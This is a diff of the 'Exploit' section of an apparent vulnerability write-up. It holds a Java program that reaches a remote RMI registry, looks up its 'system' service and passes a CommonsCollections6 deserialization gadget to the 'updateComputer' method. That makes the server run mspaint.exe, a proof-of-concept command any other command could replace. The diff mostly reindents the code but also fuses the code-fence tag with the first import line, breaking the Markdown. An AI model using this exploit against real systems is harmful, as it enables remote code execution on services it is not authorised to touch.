@@ -122,8 +122,7 @@ To summarize what is the case:
 #### Exploit:
 ---
 
-```java
-import java.lang.reflect.Method;
+```javaimport java.lang.reflect.Method;
 import java.lang.reflect.Proxy;
 import java.rmi.registry.LocateRegistry;
 import java.rmi.registry.Registry;
@@ -137,28 +136,28 @@ public class Main {
 
 	public static void main(String[] args) throws Throwable {
 
-	    try {
+	  try {
 
-				String serverIP = args[0];
-				int serverPort = 41009;
-				
-				Registry registry = LocateRegistry.getRegistry(serverIP, serverPort);			// [1]
-				SystemServiceInterface ssi = (SystemServiceInterface) registry.lookup("system");	// [2]
-				
-				InvocationHandler ih = Proxy.getInvocationHandler(ssi);					// [3]
-				Method method = SystemServiceInterface.class.getMethod("updateComputer", new Class[] {ComputerConfig.class });	// [4]
-				Object payload = new CommonsCollections6().getObject("mspaint.exe");			// [5]
+		String serverIP = args[0];
+		int serverPort = 41009;
+			
+		Registry registry = LocateRegistry.getRegistry(serverIP, serverPort);			// [1]
+		SystemServiceInterface ssi = (SystemServiceInterface) registry.lookup("system");	// [2]
+			
+		InvocationHandler ih = Proxy.getInvocationHandler(ssi);					// [3]
+		Method method = SystemServiceInterface.class.getMethod("updateComputer", new Class[] {ComputerConfig.class });	// [4]
+		Object payload = new CommonsCollections6().getObject("mspaint.exe");			// [5]
 
-				Object[] params = new Object[] {							// [6]
-						payload
-				};
-				
-				ih.invoke(ssi, method, params);								// [7]
+		Object[] params = new Object[] {							// [6]
+			payload
+		};
+			
+		ih.invoke(ssi, method, params);								// [7]
 
-	    } catch (Exception e) {
-	    	System.out.println(e.toString());
-	    	e.printStackTrace();
-	    }
+	  } catch (Exception e) {
+	  	System.out.println(e.toString());
+	  	e.printStackTrace();
+	  }
 	}
 }
 
